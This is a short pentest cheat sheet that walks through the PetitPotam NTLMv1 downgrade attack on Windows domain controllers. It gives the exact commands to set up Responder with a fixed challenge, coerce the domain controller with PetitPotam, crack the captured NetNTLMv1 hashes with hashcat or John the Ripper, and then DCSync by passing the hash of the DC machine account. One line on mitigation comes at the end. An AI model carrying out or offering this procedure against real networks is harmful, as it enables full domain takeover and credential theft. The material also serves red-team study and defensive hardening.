# Petit Potam

## Github repo: https://github.com/topotam/PetitPotam

###  Coerce a callback using PetitPotam or SpoolSample on an affected machine and downgrade the authentication to NetNTLMv1 Challenge/Response authentication. This uses the outdated encryption method DES to protect the NT/LM Hashes.

## Requirements:

### LmCompatibilityLevel = 0x1: Send LM & NTLM

 - reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v lmcompatibilitylevel

## Exploitation

#### 1) Capturing using Responder: Edit the /etc/responder/Responder.conf file to include the magical 1122334455667788 challenge

#### 2) Fire Responder

 - sudo responder -I eth0 --lm

### If --disable-ess is set, extended session security will be disabled for NTLMv1 authentication

#### 3) Force a callback

 - PetitPotam.exe Responder-IP DC-IP

 - PetitPotam.py -u Username -p Password -d Domain -dc-ip DC-IP Responder-IP DC-IP

#### 4) Crack the captured hashes with hashcat or John The Ripper

 - hashcat -m 5500 -a 3 hash.txt

 - john --format=netntlm hash.txt

#### 5) Now you can DCSync using the Pass-The-Hash with the DC machine account

## WARNING!: : NTLMv1 with SSP(Security Support Provider) changes the server challenge and is not quite ideal for the attack, but it can be used.

# MITIGATIONS

### Set the Lan Manager authentication level to Send NTLMv2 responses only. Refuse LM & NTLM
